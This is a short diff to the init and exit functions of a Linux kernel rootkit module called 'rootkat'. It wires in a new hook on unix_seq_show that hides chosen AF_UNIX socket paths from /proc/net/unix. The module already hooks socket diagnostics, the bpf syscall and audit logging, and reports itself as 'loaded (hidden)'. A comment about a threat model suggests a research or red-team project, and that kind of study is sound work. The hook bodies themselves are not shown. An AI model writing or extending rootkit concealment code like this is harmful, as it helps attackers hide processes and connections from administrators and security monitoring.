@@ -13,6 +13,8 @@
 #include "hook_inet_sk_diag_fill.h"
 #include "hook_sys_bpf.h"
 #include "hook_audit.h"
+#include "hook_unix_seq_show.h"
+#include "hidden_unix_paths.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -21,6 +23,8 @@ static int __init rootkat_init(void)
 	int rc;
 
 	pr_info(ROOTKAT_TAG "loading\n");
+
+	rootkat_hidden_unix_paths_init();
 
 	rc = rootkat_kallsyms_init();
 	if (rc) {
@@ -95,12 +99,21 @@ static int __init rootkat_init(void)
 	if (rc)
 		pr_warn(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);
 
+	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. The matching
+	 * NETLINK_SOCK_DIAG path remains uncovered for v0.7 (see
+	 * docs/threat-model.md). */
+	rc = rootkat_hook_unix_seq_show_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
+		        rc);
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_unix_seq_show_remove();
 	rootkat_hook_audit_log_start_remove();
 	rootkat_hook_sys_bpf_remove();
 	rootkat_hook_inet_sk_diag_fill_remove();
